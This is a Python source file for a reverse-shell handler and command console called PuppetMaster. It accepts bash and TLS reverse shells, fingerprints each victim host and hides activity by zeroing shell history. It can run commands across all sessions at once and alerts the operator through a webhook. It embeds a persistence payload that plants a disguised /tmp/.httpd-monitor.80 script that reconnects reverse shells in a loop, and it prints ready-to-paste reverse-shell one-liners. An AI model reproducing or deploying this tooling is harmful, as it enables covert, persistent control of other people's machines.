import sys
import ssl
import random
import hashlib
import asyncio
import datetime
import readline
import traceback
from qqwry import QQwry

print('''\033[1;37m
                                                                
          ____                                                  
        ,'  , `.                       ___                      
     ,-+-,.' _ |                     ,--.'|_                    
  ,-+-. ;   , ||                     |  | :,'           __  ,-. 
 ,--.'|'   |  ;|            .--.--.  :  : ' :         ,' ,'/ /| 
|   |  ,', |  ': ,--.--.   /  /    .;__,'  /    ,---. '  | |' | 
|   | /  | |  ||/       \ |  :  /`.|  |   |    /     \|  |   ,' 
'   | :  | :  |.--.  .-. ||  :  ;_ :__,'| :   /    /  '  :  /   
;   . |  ; |--' \__\/: . . \  \    `.'  : |__.    ' / |  | '    
|   : |  | ,    ," .--.; |  `----.   |  | '.''   ;   /;  : |    
|   : '  |/    /  /  ,.  | /  /`--'  ;  :    '   |  / |  , ;    
;   | |`-'    ;  :   .'   '--'.     /|  ,   /|   :    |---'     
|   ;/        |  ,     .-./ `--'---'  ---`-'  \   \  /          
'---'          `--`---'                        `----'           
                                                                
\033[0m''')

reverse_host     = "127.0.0.1"
reverse_tcp_port = "47080"
reverse_ssl_port = "47443"
MultiMaster_port = "47470"
webhook_url      = ""

class PuppetMaster:
    def __init__(self):
        self.sessions = list()
        self.handlers = list()
        self.quiet              = False
        self.Persistence        = False
        self.current_session    = None
        self.DuplicateSession   = False
        self.PersistenceCommand = f'(ps -ef|grep /tmp/.httpd-monitor.80|grep -v grep) || (echo "while true;do sleep 474;(mkfifo /tmp/-;bash -i</tmp/-|&openssl s_client -quiet -connect {reverse_host}:{reverse_ssl_port}>/tmp/-;rm /tmp/-)||(bash -i>&/dev/tcp/{reverse_host}/{reverse_tcp_port} 0>&1); done;">/tmp/.httpd-monitor.80 && chmod +x /tmp/.httpd-monitor.80 && (nohup bash /tmp/.httpd-monitor.80 >/dev/null 2>&1 &))'
      
    async def execute_cmd(self, command):
        command = command + "\n"
        if self.current_session.get("writer") and self.current_session.get("reader"):
            try:
                self.current_session["writer"].write( command.encode() )
                await self.current_session["writer"].drain()
            except Exception as e:
                print(e)


Puppet_Master = PuppetMaster()

def completer(text, state):
    func = ['cls', 'clear', 'listeners', 'handlers', 'sessions', 'execute ', 'quiet', 'close', 'history', 'exit', 'BATCH-EXECUTE ', 'use '] + [ _['hash'] for _ in Puppet_Master.sessions ]
    matches = [ _ for _ in func if _.startswith(text) ]
    if state < len(matches):
        return matches[state]
    else:
        return None

readline.parse_and_bind('tab: complete')
readline.set_completer(completer)

IPSelect = QQwry()
IPSelect.load_file("qqwry.dat")

async def handle_shell_init(reader, writer):

    init_data = bytes()

    randomStringInitSuffix     = randomString()
    randomStringHashPrefix     = randomString()
    randomStringHashSuffix     = randomString()
    randomStringWhoamiPrefix   = randomString()
    randomStringWhoamiSuffix   = randomString()
    randomStringCPUinfoPrefix  = randomString()
    randomStringCPUinfoSuffix  = randomString()
    randomStringHostnamePrefix = randomString()
    randomStringHostnameSuffix = randomString()    

    while True:
        try:
            randomStringInitPrefix = randomString()
            writer.write( "export HISTSIZE=0; echo {};\n".format(randomStringInitPrefix).encode() )
            await writer.drain()
            await asyncio.sleep(4)

            data = await asyncio.wait_for( reader.read(40960), timeout=10 )

            init_data += data
            if randomStringInitPrefix in data.decode().replace(f"echo {randomStringInitPrefix}", ""):
                break

        except asyncio.TimeoutError:
            writer.close()
            return None

        except KeyboardInterrupt:
            print("Ctrl + C")

        except Exception as e :
            print(traceback.format_exc())
            writer.close()
            return None
    
    init_command = str()
    init_command += "export HISTSIZE=0;"
    init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n"
    init_command += f"echo {randomStringCPUinfoPrefix} && cat /proc/cpuinfo && echo {randomStringCPUinfoSuffix}\n"
    init_command += f"echo {randomStringHostnamePrefix} && (hostname||cat /etc/hostname) && echo {randomStringHostnameSuffix}\n"
    init_command += f"echo {randomStringHashPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringHashSuffix}\n"
    writer.write( init_command.encode() )
    await writer.drain()

    #如果持久化选项为True则执行deamon进程持久化命令
    if Puppet_Master.Persistence:
        writer.write( Puppet_Master.PersistenceCommand.encode() + "\n".encode() )
        await writer.drain()

    writer.write( f"echo {randomStringInitSuffix}\n".encode() )
    await writer.drain()

    while True:
        try:
            data = await asyncio.wait_for( reader.read(40960), timeout=10 )
            init_data += data

            if randomStringInitSuffix in data.decode().replace(f"echo {randomStringInitSuffix}", ""):
                # getTextBetweenStrings()未匹配到则返回<unknown>,若hostname或uesrname中包含也返回<unknown>
                puppetHash = getTextBetweenStrings(
                        init_data.decode().replace(f"echo {randomStringHashPrefix}", "").replace(f"echo {randomStringHashSuffix}", ""),
                        randomStringHashPrefix,
                        randomStringHashSuffix
                        ).strip()

                username = getTextBetweenStrings(
                        init_data.decode().replace(f"echo {randomStringWhoamiPrefix}", "").replace(f"echo {randomStringWhoamiSuffix}", ""),
                        randomStringWhoamiPrefix,
                        randomStringWhoamiSuffix
                        ).strip()

                hostname = getTextBetweenStrings(
                        init_data.decode().replace(f"echo {randomStringHostnamePrefix}", "").replace(f"echo {randomStringHostnameSuffix}", ""),
                        randomStringHostnamePrefix,
                        randomStringHostnameSuffix
                        ).strip()

                cpuinfo  = getTextBetweenStrings(
                        init_data.decode().replace(f"echo {randomStringCPUinfoPrefix}", "").replace(f"echo {randomStringCPUinfoSuffix}", ""),
                        randomStringCPUinfoPrefix,
                        randomStringCPUinfoSuffix
                        ).strip()

                if "\n" in hostname:
                    hostname = "<unknown>"
                  
                if "\n" in username:
                    username = "<unknown>"

                #获取CPU核心数
                if "model name" in cpuinfo:
                    session_cpu_core = str(cpuinfo.count("model name"))
                elif "vendor_id" in cpuinfo:
                    session_cpu_core = str(cpuinfo.count("vendor_id"))
                else:
                    session_cpu_core = str(cpuinfo.count("processor"))

                #根据系统信息计算Session Hash
                session_hash = hashlib.md5(puppetHash.encode()).hexdigest()

                session = dict()
                peername = writer.get_extra_info("peername")
                sockname = writer.get_extra_info("sockname")
                peername = peername[0]+":"+str(peername[1])
                sockname = sockname[0]+":"+str(sockname[1])
                session["inittime"] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                session["peername"] = peername
                session["sockname"] = sockname
                session["username"] = username
                session["hostname"] = hostname
                session["history"]  = bytes()
                session["reader"]   = reader
                session["writer"]   = writer
                session["hash"]     = session_hash
                session["core"]     = session_cpu_core
                session["org"]      = str()

                if ( session["hash"] not in [ _["hash"] for _ in Puppet_Master.sessions ] ) or ( Puppet_Master.DuplicateSession ):
                    org = IPSelect.lookup(peername.split(":")[0])

                    session["org"] = org[0]+org[1]
                    Puppet_Master.sessions.append(session)
                    PrintInfo(f'Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}')
                    dingding_send_meassage( f'Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")} {org}' )
                    break

                else:
                    if Puppet_Master.quiet == False:
                        print(f'\033[33m[*] Session {session_hash} {hostname} {username}  {sockname} -> {peername} in sessions list {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}\033[0m')
                    writer.close()
                    return None

            elif not data.decode():
                return None

        except asyncio.TimeoutError:
            writer.close()
            return None

        except KeyboardInterrupt:
            print("Ctrl + C")

        except Exception as e :
            print(traceback.format_exc())
            writer.close()
            return None

    while writer.is_closing()==False:
        try:
            data = await reader.read(40960)
            if data.decode():
                Puppet_Master.sessions[Puppet_Master.sessions.index(session)]["history"] += data
                if Puppet_Master.current_session and Puppet_Master.current_session["peername"] == peername:
                    print(data.decode(), end="")
    
            else:
                writer.close()
                Puppet_Master.sessions.remove(session)
        except Exception as e:
            print(e)
            continue


    print(f'\033[1;31m[*]\033[0m Session \033[1;37m{session_hash}\033[0m {hostname} {username}  \033[1;37m{sockname} -> {peername}\033[0m {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")} Close')

MasterPrompt = "\033[1;4;37mMaster\033[0m > "
ConsolePrompt = "\033[1;4;37mMaster\033[0m > "
async def MasterConsole():
    while True:
        #Python 3.7 3.8 
        #print(ConsolePrompt, end="")
        #console_cmd = await asyncio.get_running_loop().run_in_executor(None, input)

        #Python 3.9 3.10 3.11 ......
        if Puppet_Master.current_session:
            ConsolePrompt = f"(\033[1;4;34m{Puppet_Master.current_session['hash'][:8]}\033[0m) > "
        else:
            ConsolePrompt = MasterPrompt
        console_cmd = await asyncio.to_thread(input, ConsolePrompt)
        console_cmd = console_cmd.strip()

        if console_cmd == "exit":
            for handler in Puppet_Master.handlers:
                handler.close()
            break

        elif console_cmd.split() and console_cmd.split()[0] == "sessions" :
            print(
                    "Sessions {}".format(len(Puppet_Master.sessions)).ljust(32," ") + " " +
                    "Hostname".ljust(20," ") + " " +
                    "Username".ljust(8," ") + " " +
                    "CPU "
                    )
            print(
                    "="*32 + " " +
                    "="*20 + " " +
                    "="*8 + " " +
                    "="*3  + " " 
                    )
            for session in Puppet_Master.sessions:
                print(f"\033[1;37m{session['hash']}\033[0m {session['hostname'].ljust(20,' ')} {session['username'].ljust(8,' ')} {session['core'].ljust(3,' ')} {session['sockname']} -> {session['peername'].ljust(21,' ')} {session['inittime']} {session['org']} ")
            
        elif console_cmd.split() and console_cmd.split()[0] == "listerner":
            print()

        elif console_cmd.split() and console_cmd.split()[0] == "execute"  :
            if Puppet_Master.current_session or "-i" in console_cmd.split():
                #备注：需要优先处理-i后的会话,暂未实现
                if "-c" in console_cmd.split():
                    execute_cmd = console_cmd.split()[console_cmd.split().index("-c") +1]

                elif len(console_cmd.split()) > 1 :
                    execute_cmd = " ".join( console_cmd.split()[console_cmd.split().index("execute")+1:] )

                execute_result = await Puppet_Master.execute_cmd( execute_cmd )

        elif console_cmd.split() and console_cmd.split()[0] == "BATCH-EXECUTE"  :
                if len(console_cmd.split()) > 1 :
                    execute_cmd = " ".join( console_cmd.split()[console_cmd.split().index("BATCH-EXECUTE")+1:] )

                for session in Puppet_Master.sessions:
                    Puppet_Master.current_session = Puppet_Master.sessions[Puppet_Master.sessions.index(session)]
                    execute_result = await Puppet_Master.execute_cmd( execute_cmd )
                    PrintInfo( f"{Puppet_Master.current_session['hash']} {Puppet_Master.current_session['peername']} {Puppet_Master.current_session['org']} Executed." )

                Puppet_Master.current_session = None

        elif Puppet_Master.current_session and console_cmd.strip() == "shell"  :
            execute_result = await Puppet_Master.execute_cmd( "\n" )
            while True:
                ConsolePrompt = ""
                shell_cmd = await asyncio.to_thread(input, ConsolePrompt)
                shell_cmd = shell_cmd.strip()
                if shell_cmd == "exit" or shell_cmd == "bg":
                    break
                execute_result = await Puppet_Master.execute_cmd( shell_cmd )
              
        elif Puppet_Master.current_session and console_cmd.strip() == "close"  :
            Puppet_Master.current_session["writer"].close()
            Puppet_Master.current_session = None

        elif console_cmd.split() and console_cmd.split()[0] == "use":
            if len(console_cmd.split()) >1:
                session_id = console_cmd.split()[1]
                for session in Puppet_Master.sessions:
                    if session_id == session["hash"] or session_id == session["peername"]:
                        Puppet_Master.current_session = Puppet_Master.sessions[Puppet_Master.sessions.index(session)]
            else:
                print("\033[1;31m[!] Use Session Hash or Peername/RemoteAddress......\033[0m")

        elif Puppet_Master.current_session and console_cmd == "bg":
            Puppet_Master.current_session = None

        elif Puppet_Master.current_session and console_cmd == "history":
            history = "".join( [ session["history"].decode() for session in Puppet_Master.sessions if session["hash"]==Puppet_Master.current_session["hash"] ] )
            print(history)

        elif console_cmd == "quiet":
            if Puppet_Master.quiet == True:
                Puppet_Master.quiet = False       
            else:
                Puppet_Master.quiet = True
            print( "Quiet => {}".format(Puppet_Master.quiet) )
            
        else:
            continue
    return
def PrintInfo(string):
    prefix = "\033[1;32m[*]\033[0m "
    print( prefix + string )
    return prefix + string

def randomString():
    return ''.join(random.sample('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 16))

def getTextBetweenStrings(text, start_string, end_string):
    if (start_string not in text) or (end_string not in text):
        return "<unknown>"
    start_index = text.rfind(start_string) + len(start_string)
    end_index = text.rfind(end_string, start_index)
    return text[start_index:end_index]
import urllib.request
import json

def dingding_send_meassage(message):
    if not webhook_url:
        return None
    data = {
    'msgtype': "text",
    "text": { 'content':'<h1>Master Session:</h1>\n' + message }
    }
    
    header = {
        "Content-Type": "application/json",
        "Charset": "UTF-8"
    }
    send_data = json.dumps(data)
    send_data = send_data.encode("utf-8")
    request = urllib.request.Request(url=webhook_url, data=send_data, headers=header)

    opener = urllib.request.urlopen(request)

async def main():
    keyfile    = 'key.pem'
    certfile   = 'cert.pem'
    SSLcontext = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    SSLcontext.load_cert_chain(certfile=certfile, keyfile=keyfile)
    reverse_tcp_server = await asyncio.start_server(handle_shell_init, '0.0.0.0', reverse_tcp_port )
    reverse_ssl_server = await asyncio.start_server(handle_shell_init, '0.0.0.0', reverse_ssl_port, ssl=SSLcontext )
    #MultiMaster        = await asyncio.start_server(MultiMaster,       '0.0.0.0', MultiMaster_port, ssl=SSLcontext )

    addr     = reverse_tcp_server.sockets[0].getsockname()
    addr     = addr[0]+":"+str(addr[1])

    ssl_addr = reverse_ssl_server.sockets[0].getsockname()
    ssl_addr = ssl_addr[0]+":"+str(ssl_addr[1])

    PrintInfo("socketListener : "+addr)
    PrintInfo("SSLSocketListener : "+ssl_addr)

    PrintInfo( f"LinuxReverseTCPCommand : bash -i>&/dev/tcp/{reverse_host}/{reverse_tcp_port} 0>&1" )
    PrintInfo( f"LinuxReverseSSLCommand : mkfifo /tmp/-;bash -i</tmp/-|&openssl s_client -quiet -connect {reverse_host}:{reverse_ssl_port}>/tmp/-;rm /tmp/-" )
    print()

    console = await MasterConsole()
    # 循环运行服务器
    Puppet_Master.handlers.append( reverse_tcp_server )
    Puppet_Master.handlers.append( reverse_ssl_server )

    async with reverse_tcp_server, reverse_ssl_server:
        await reverse_tcp_server.serve_forever()
        await reverse_ssl_server.serve_forever()

asyncio.run(main())
